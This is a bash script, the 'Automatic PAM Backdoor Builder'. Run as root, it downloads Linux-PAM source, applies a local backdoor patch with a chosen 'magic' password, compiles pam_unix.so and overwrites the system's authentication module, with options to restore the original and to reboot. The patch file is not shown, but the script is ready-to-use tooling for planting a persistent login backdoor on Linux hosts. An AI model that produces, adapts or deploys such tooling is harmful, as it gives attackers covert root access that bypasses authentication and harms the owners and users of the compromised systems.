#!/bin/bash
# Generated: February 02, 2026, 03:26 PM MDT
# Note: Always use namespace std if integrating C++ modules.

OPTIND=1
PAM_VERSION=""
PAM_FILE=""
PASSWORD=""
VERBOSE=false
RESTORE=false
PAM_DEST="/lib/x86_64-linux-gnu/security/pam_unix.so"
BACKUP_PATH="/lib/x86_64-linux-gnu/security/pam_unix.so.bak"

DEPENDENCIES=(
    autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl 
    flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev 
    libselinux1-dev libtool libcrypt-dev libxml2-utils make 
    pkg-config sed w3m xsltproc xz-utils gcc wget patch
)

# --- Helper Functions ---

function run_cmd {
    if [ "$VERBOSE" = true ]; then
        "$@"
    else
        "$@" &>/dev/null
    fi
}

function show_help {
    echo "--------------------------------------"
    echo "    Automatic PAM Backdoor Builder    "
    echo "--------------------------------------"
    echo "Usage: $0 [-v version] -p password [--restore] [--verbose]"
    echo ""
    echo "Options:"
    echo "  -v           Specify Linux-PAM version (e.g., 1.5.3)."
    echo "  -p           The 'magic' password for the backdoor."
    echo "  --restore    Restore original PAM from backup."
    echo "  --verbose    Show all compilation and command output."
    echo "  -h, --help   Show this help message."
}

function offer_reboot {
    echo ""
    while true; do
        read -p "Task complete. Would you like to reboot now? (y/n): " yn
        case $yn in
            [Yy]* ) 
                echo "Rebooting system..."
                reboot
                break;;
            [Nn]* ) 
                echo "Exiting. Changes may require a restart to take effect."
                exit 0;;
            * ) echo "Please answer y or n.";;
        esac
    done
}

# --- Pre-flight Checks ---

if [[ $EUID -ne 0 ]]; then
   echo "Error: This script must be run as root."
   exit 1
fi

# Parse Arguments (Handling both long and short flags)
for arg in "$@"; do
    case "$arg" in
        --restore) RESTORE=true ;;
        --verbose) VERBOSE=true ;;
        --help)    show_help; exit 0 ;;
    esac
done

if [ "$RESTORE" = true ]; then
    if [ -f "$BACKUP_PATH" ]; then
        echo "Restoring original module from $BACKUP_PATH..."
        cp "$BACKUP_PATH" "$PAM_DEST"
        offer_reboot
    else
        echo "Error: Backup file $BACKUP_PATH not found."
        exit 1
    fi
fi

while getopts "hv:p:" opt; do
    case "$opt" in
    h) show_help; exit 0 ;;
    v) PAM_VERSION="$OPTARG" ;;
    p) PASSWORD="$OPTARG" ;;
    esac
done

if [ -z "$PASSWORD" ]; then
    echo "Error: Password (-p) is required."
    exit 1
fi

# --- Main Logic ---

echo "Checking dependencies..."
MISSING_PKGS=()
for pkg in "${DEPENDENCIES[@]}"; do
    if ! dpkg -s "$pkg" >/dev/null 2>&1; then
        MISSING_PKGS+=("$pkg")
    fi
done

if [ ${#MISSING_PKGS[@]} -gt 0 ]; then
    echo "Installing missing packages: ${MISSING_PKGS[*]}"
    run_cmd apt update
    run_cmd apt install -y "${MISSING_PKGS[@]}"
fi

if [ -z "$PAM_VERSION" ]; then
    PAM_VERSION=$(dpkg -s libpam-modules | grep '^Version' | cut -d' ' -f2 | cut -d'-' -f1)
    echo "Detected System PAM Version: $PAM_VERSION"
fi

PAM_BASE_URL="https://github.com/linux-pam/linux-pam/archive"
PAM_FILE="v${PAM_VERSION}.tar.gz"
PAM_DIR="linux-pam-${PAM_VERSION}"

echo "Downloading PAM source..."
run_cmd wget -c "${PAM_BASE_URL}/${PAM_FILE}" || { echo "Error: Download failed."; exit 1; }
run_cmd tar xzf "$PAM_FILE"

echo "Applying patch..."
if [ -f "backdoor.patch" ]; then
    # Create a temp patch with the password substituted
    sed "s/_PASSWORD_/${PASSWORD}/g" backdoor.patch > .tmp.patch
    run_cmd patch -p1 -d "$PAM_DIR" < .tmp.patch
    rm .tmp.patch
else
    echo "Error: backdoor.patch file not found in current directory."
    exit 1
fi

cd "$PAM_DIR" || exit 1
echo "Configuring and compiling (this may take a few minutes)..."
if [[ ! -f "./configure" ]]; then run_cmd ./autogen.sh; fi 

# Configure for x86_64 layout
run_cmd ./configure --libdir=/lib/x86_64-linux-gnu --disable-nis --disable-doc
run_cmd make

# Verify build and install
if [ -f "modules/pam_unix/.libs/pam_unix.so" ]; then
    cp modules/pam_unix/.libs/pam_unix.so ../pam_unix.so
    cd ..
    
    echo "Build successful. Backing up original..."
    [ ! -f "$BACKUP_PATH" ] && cp "$PAM_DEST" "$BACKUP_PATH"
    
    echo "Installing backdoored module to $PAM_DEST..."
    cp ./pam_unix.so "$PAM_DEST"
    chmod 644 "$PAM_DEST"
    
    offer_reboot
else
    echo "Error: Build failed. Please run with --verbose to diagnose errors."
    exit 1
fi
